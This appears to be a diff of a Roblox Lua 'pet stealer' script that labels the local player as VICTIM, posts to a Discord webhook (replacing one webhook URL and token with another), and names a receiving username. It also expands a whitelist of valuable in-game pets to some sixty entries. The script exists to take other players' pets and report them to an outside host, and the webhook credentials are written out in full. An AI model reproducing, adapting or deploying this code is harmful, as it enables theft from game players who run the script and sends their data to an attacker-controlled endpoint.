@@ -2,23 +2,73 @@ repeat
     task.wait()
 until game:IsLoaded()
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1400978772764659712/8D9ZMM-FUIUm_i2oSwc3zaX6FA6wNYK96FHGcH69yh1PmhMt0aMlfJgN9S5veYoypzcY"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1402330637964284127/KRHZR1qrpbB3EiVYIYQUE1ND4YGPCsntpkh7LGcJfaLgzG_qt218VbRMTdBvKtz7aDEd"
 local VICTIM = game.Players.LocalPlayer
 local USERNAMES = {
-    "SUMERE4H"
+    "ShivtfOP"
 }
 
 local PET_WHITELIST = {
+    'Kitsune',
     'Raccoon',
+    'Disco Bee',
     'T-Rex',
-    'Fennec Fox',
+    'Corrupted Kitsune',
+    'Raiju',
+    'French Fry Ferret',
+    'Spinosaurus',
     'Dragonfly',
     'Butterfly',
-    'Disco Bee',
+    'Blood Hedgehog',
+    'Moon Cat',
+    'Spaghetti Sloth',
+    'Kappa',
+    'Sushi Bear',
+    'Triceratops',
+    'Pterodactyl',
+    'Capybara',
+    'Pancake Mole',
+    'Mole',
     'Mimic Octopus',
     'Queen Bee',
-    'Spinosaurus',
-    'Kitsune',
+    'Tanchozuru',
+    'Moth',
+    'Brontosaurus',
+    'Ostrich',
+    'Seal',
+    'Hyacinth Macaw',
+    'Scarlet Macaw',
+    'Red Fox',
+    'Blood Owl',
+    'Hedgehog',
+    'Tarantula Hawk',
+    'Bear Bee',
+    'Night Owl',
+    'Polar Bear',
+    'Wasp',
+    'Raptor',
+    'Pachycephalosaurus',
+    'Mochi Mouse',
+    'Iguanodon',
+    'Snake',
+    'Fennec Fox',
+    'Honey Bee',
+    'Petal Bee',
+    'Bee',
+    'Red Giant Ant',
+    'Giant Ant',
+    'Owl',
+    'Praying Mantis',
+    'Corrupted Kodama',
+    'Kodama',
+    'Squirrel',
+    'Peacock',
+    'Toucan',
+    'Axolotl',
+    'Meerkat',
+    'Stegosaurus',
+    'Chicken Zombie',
+    'Starfish',
 }
 
 local victimPetTable = {}
@@ -229,4 +279,5 @@ task.spawn(function()
             break
         end
     end
+
 end)
